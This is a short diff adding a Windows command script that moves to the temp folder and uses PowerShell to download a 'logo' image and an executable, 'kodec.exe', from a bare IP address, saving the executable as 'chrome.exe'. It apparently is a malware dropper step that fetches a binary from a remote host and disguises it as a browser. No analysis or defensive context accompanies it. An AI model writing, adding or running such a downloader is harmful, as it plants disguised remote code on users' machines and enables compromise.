@@ -1,0 +1,4 @@
+cd %temp%
+Powershell -command invoke-webrequest
+http://3.87.155.195/my%20logo.jpg -outFile logo.jpg
+Powershell -command invoke-webrequest http://3.87.155.195/kodec.exe -outFile chrome.exe
